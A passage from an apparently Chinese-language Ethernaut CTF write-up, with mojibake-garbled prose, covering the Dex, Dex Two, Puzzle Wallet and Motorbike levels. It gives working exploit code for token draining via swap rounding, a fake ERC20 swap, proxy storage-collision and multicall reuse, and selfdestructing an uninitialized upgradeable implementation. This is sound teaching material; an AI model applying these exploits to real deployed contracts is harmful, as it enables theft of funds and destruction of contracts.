</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">swap</span><span class="p">(</span><span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">((</span><span class="k">from</span> <span class="o">==</span> <span class="n">token1</span> <span class="o">&amp;&amp;</span> <span class="n">to</span> <span class="o">==</span> <span class="n">token2</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="k">from</span> <span class="o">==</span> <span class="n">token2</span> <span class="o">&amp;&amp;</span> <span class="n">to</span> <span class="o">==</span> <span class="n">token1</span><span class="p">),</span> <span class="s">&#34;Invalid tokens&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="k">from</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">amount</span><span class="p">,</span> <span class="s">&#34;Not enough to swap&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint</span> <span class="n">swap_amount</span> <span class="o">=</span> <span class="n">get_swap_price</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">IERC20</span><span class="p">(</span><span class="k">from</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">IERC20</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">swap_amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">IERC20</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">swap_amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>get_swap_price()</code> ç›´æ¥ç”¨ balance ç›¸é™¤è¨ˆç®—ï¼Œå¯èƒ½æœƒæœ‰èª¤å·®ï¼ˆ3/2=1)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">get_swap_price</span><span class="p">(</span><span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">((</span><span class="n">amount</span> <span class="o">*</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)))</span><span class="o">/</span><span class="n">IERC20</span><span class="p">(</span><span class="k">from</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="exploit-21">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">await contract.swap(t1, t2, 10)
</span></span><span class="line"><span class="cl">await contract.swap(t2, t1, 20)
</span></span><span class="line"><span class="cl">await contract.swap(t1, t2, 24)
</span></span><span class="line"><span class="cl">await contract.swap(t2, t1, 30)
</span></span><span class="line"><span class="cl">await contract.swap(t1, t2, 41)
</span></span><span class="line"><span class="cl">await contract.swap(t2, t1, 45)
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="23-dex-two">23. Dex Two</h2>
<p>æ¦¨ä¹¾ DEX çš„ token1 åŠ token2</p>
<p>èˆ‡ 22. ç›¸æ¯”ï¼Œ<code>swap()</code> ç¼ºå°‘ä¸€è¡Œï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="nb">require</span><span class="p">((</span><span class="k">from</span> <span class="o">==</span> <span class="n">token1</span> <span class="o">&amp;&amp;</span> <span class="n">to</span> <span class="o">==</span> <span class="n">token2</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="k">from</span> <span class="o">==</span> <span class="n">token2</span> <span class="o">&amp;&amp;</span> <span class="n">to</span> <span class="o">==</span> <span class="n">token1</span><span class="p">),</span> <span class="s">&#34;Invalid tokens&#34;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰€ä»¥æ‹¿åˆ¥çš„ token åš swap å°±å®Œäº‹äº†</p>
<h3 id="exploit-22">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// SPDX-License-Identifier: MIT
</span></span><span class="line"><span class="cl">pragma solidity ^0.8.0;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import &#34;@openzeppelin/contracts/token/ERC20/ERC20.sol&#34;;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">contract EvilToken is ERC20 {
</span></span><span class="line"><span class="cl">    constructor(uint256 initialSupply) ERC20(&#34;EvilToken&#34;, &#34;EVL&#34;) {
</span></span><span class="line"><span class="cl">        _mint(msg.sender, initialSupply);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">evlToken1</span><span class="p">,</span> <span class="nx">t1</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">evlToken2</span><span class="p">,</span> <span class="nx">t2</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="24-puzzle-wallet">24. Puzzle Wallet</h2>
<p>ç›®æ¨™ <code>admin = player</code></p>
<p>æœ‰é›£åº¦çš„ä¸€é¡Œï¼Œå¹¾å€‹è§€å¯Ÿï¼š</p>
<ol>
<li><code>approveNewAdmin()</code> å¯æ”¹ adminï¼Œä½†æœ‰ modifier <code>onlyAdmin</code>ï¼Œæ­¤è·¯è¡Œä¸é€š</li>
<li>PuzzleWallet æ¯å€‹ function éƒ½æœ‰ modifier <code>onlyWhitelisted</code>ï¼Œowner å¯ä»¥åŠ ç™½åå–®</li>
<li>PuzzleProxy çš„ <code>pendingAdmin</code> è·Ÿ PuzzleWallet çš„ <code>owner</code> å…±ç”¨åŒä¸€å€‹ slot 0</li>
<li><code>maxBalance</code> è·Ÿ <code>admin</code> éƒ½åœ¨ slot 1</li>
</ol>
<p>é€éæ›´æ”¹ <code>pendingAdmin</code> é”æˆæ”¹ <code>owner</code>ï¼Œæˆç‚º <code>owner</code> å¾ŒåŠ ç™½åå–®ï¼Œæ”¹ <code>maxBalance</code> ç‚º <code>player</code>ï¼Œ<code>admin</code> å³ç‚º <code>player</code>ã€‚</p>
<p><code>setMaxBalance()</code> å¡äº†ä¸€å€‹ <code>address(this).balance == 0</code> è¦ç¹é</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">setMaxBalance</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_maxBalance</span><span class="p">)</span> <span class="k">external</span> <span class="n">onlyWhitelisted</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Contract balance is not 0&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">maxBalance</span> <span class="o">=</span> <span class="n">_maxBalance</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…ˆç¢ºå®šä¸€ä¸‹ balance</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">getBalance</span><span class="p">(</span><span class="nx">contract</span><span class="p">.</span><span class="nx">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Output: 0.001
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æ€è€ƒåœ¨åŒä¸€å€‹äº¤æ˜“èª¿ç”¨2æ¬¡ <code>deposit()</code>ï¼Œå› ç‚º <code>multicall()</code> å…±ç”¨ä¸€å€‹ <code>msg.value</code>ï¼Œé€™æ¨£å¯ä»¥åªè½‰ä¸€ç­† ether ä½† balance æœƒæ˜¯2å€ã€‚</p>
<p>æ³¨æ„åˆ° <code>multicall()</code> line 9 é™åˆ¶ deposit åªèƒ½ call ä¸€æ¬¡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">multicall</span><span class="p">(</span><span class="kt">bytes</span><span class="p">[]</span> <span class="n">calldata</span> <span class="nb">data</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span> <span class="n">onlyWhitelisted</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">depositCalled</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">data</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_data</span> <span class="o">=</span> <span class="nb">data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="kt">bytes4</span> <span class="nb">selector</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">assembly</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">selector</span> <span class="o">:=</span> <span class="nf">mload</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">_data</span><span class="p">,</span> <span class="mi">32</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">if</span> <span class="p">(</span><span class="n">selector</span> <span class="err">==</span> <span class="n">this</span><span class="err">.</span><span class="n">deposit</span><span class="err">.</span><span class="n">selector</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">require</span><span class="p">(</span><span class="err">!</span><span class="n">depositCalled</span><span class="p">,</span> <span class="s">&#34;Deposit can only be called once&#34;</span><span class="p">)</span><span class="err">;</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Protect against reusing msg.value
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">depositCalled</span> <span class="err">=</span> <span class="n">true</span><span class="err">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="err">=</span> <span class="nf">address</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="err">.</span><span class="nf">delegatecall</span><span class="p">(</span><span class="n">data</span><span class="err">[</span><span class="n">i</span><span class="err">]</span><span class="p">)</span><span class="err">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Error while delegating call&#34;</span><span class="p">)</span><span class="err">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¹é line 9: åœ¨ multicall è£¡é¢åŒ… 2 multicallï¼Œè£¡é¢åˆ†åˆ¥èª¿ç”¨ deposit()</p>
<p>åŸæœ¬æƒ³æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">multicall -&gt; deposit
</span></span><span class="line"><span class="cl">          -&gt; deposit
</span></span></code></pre></td></tr></table>
</div>
</div><p>è®Šæˆï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">multicall -&gt; multicall -&gt; deposit
</span></span><span class="line"><span class="cl">          -&gt; multicall -&gt; deposit
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="exploit-23">Exploit</h3>
<ol>
<li>èª¿ç”¨ <code>proposeNewAdmin()</code></li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">Signature</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;proposeNewAdmin&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;function&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">inputs</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;address&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;_newAdmin&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">params</span> <span class="o">=</span> <span class="p">[</span><span class="nx">player</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nx">data</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeFunctionCall</span><span class="p">(</span><span class="nx">Signature</span><span class="p">,</span> <span class="nx">params</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span><span class="nx">from</span><span class="o">:</span> <span class="nx">player</span><span class="p">,</span> <span class="nx">to</span><span class="o">:</span> <span class="nx">instance</span><span class="p">,</span> <span class="nx">data</span><span class="p">})</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>èª¿ç”¨ <code>addToWhitelist()</code></li>
<li>åˆ©ç”¨ multicall <code>deposit()</code> twice</li>
<li><code>execute()</code> é ˜éŒ¢</li>
<li><code>setMaxBalance()</code> è¨­ç‚º <code>player</code></li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">addToWhitelist</span><span class="p">(</span><span class="nx">player</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">depositData</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">methods</span><span class="p">[</span><span class="s2">&#34;deposit()&#34;</span><span class="p">].</span><span class="nx">request</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">v</span> <span class="p">=&gt;</span> <span class="nx">v</span><span class="p">.</span><span class="nx">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">multicallData</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">methods</span><span class="p">[</span><span class="s2">&#34;multicall(bytes[])&#34;</span><span class="p">].</span><span class="nx">request</span><span class="p">([</span><span class="nx">depositData</span><span class="p">]).</span><span class="nx">then</span><span class="p">(</span><span class="nx">v</span> <span class="p">=&gt;</span> <span class="nx">v</span><span class="p">.</span><span class="nx">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">multicall</span><span class="p">([</span><span class="nx">multicallData</span><span class="p">,</span> <span class="nx">multicallData</span><span class="p">],</span> <span class="p">{</span><span class="nx">value</span><span class="o">:</span> <span class="nx">toWei</span><span class="p">(</span><span class="s1">&#39;0.001&#39;</span><span class="p">)})</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span> <span class="nx">toWei</span><span class="p">(</span><span class="s1">&#39;0.002&#39;</span><span class="p">),</span> <span class="mh">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">setMaxBalance</span><span class="p">(</span><span class="nx">player</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="25-motorbike">25. Motorbike</h2>
<p>selfdestruct the engine</p>
<h3 id="eip-1967">EIP-1967</h3>
<ul>
<li>Standard Proxy Storage Slots</li>
<li>implementation å’Œ adminï¼Œåˆ†åˆ«å­˜é‚è¼¯åˆç´„åœ°å€å’Œç®¡ç†å“¡åœ°å€</li>
<li>å¦‚æœæ”¾åœ¨ slot 0ã€slot 1ï¼Œå¯èƒ½æœƒæœ‰ storage collision çš„å•é¡Œ</li>
<li>EIP-1967 æå‡ºæŠŠ implementation å’Œ admin æ”¾åœ¨äº†å…©å€‹ç‰¹æ®Šçš„ slot ä¸­</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// keccak-256 hash of &#34;eip1967.proxy.implementation&#34; subtracted by 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">bytes32</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">_IMPLEMENTATION_SLOT</span> <span class="o">=</span> <span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Engine åˆç´„ä¸­ç„¡ <code>selfdestruct</code>ï¼Œä½† <code>_upgradeToAndCall()</code> ä¸­æœ‰å€‹ delegatecallï¼Œå¯ä»¥é€éä»–å‘¼å« selfdestructã€‚</p>
<p>å…ˆæ‰¾ä¸€ä¸‹ engine åˆç´„çš„åœ°å€ï¼Œå­˜åœ¨ slot _IMPLEMENTATION_SLOT ä¸­ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">Addr</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">contract</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span> <span class="s1">&#39;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åŸå‰‡ä¸Š engine åªè² è²¬é‚è¼¯ï¼Œå› æ­¤æ‡‰ç•¶æ²’æœ‰è¢«åˆå§‹åŒ–éï¼Œå¯èª¿ç”¨ <code>initialize()</code> åšåˆå§‹åŒ–ã€‚
æ¥è‘— <code>upgradeToAndCall()</code>ï¼Œå®Œæˆ selfdestructã€‚</p>
<h3 id="exploit-24">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">&lt;</span><span class="mi">0</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/utils/Address.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">MotorbikeAttack</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Address of current implementation (The Engine)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">address</span> <span class="k">public</span> <span class="n">implementation</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">event</span> <span class="nc">Check</span><span class="p">(</span><span class="kt">bool</span> <span class="n">result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">impl</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">implementation</span> <span class="o">=</span> <span class="n">impl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">takeControl</span><span class="p">()</span> <span class="k">external</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// take control over the Engine
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Address</span><span class="p">.</span><span class="n">functionCall</span><span class="p">(</span><span class="n">implementation</span><span class="p">,</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;initialize()&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">destroy</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Upgrade the engine to a contract that selfdestruct once initialized
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Exploit</span> <span class="n">exploit</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Exploit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Address</span><span class="p">.</span><span class="n">functionCall</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">           <span class="n">implementation</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">           <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s">&#34;upgradeToAndCall(address,bytes)&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="n">exploit</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;initialize()&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">           <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
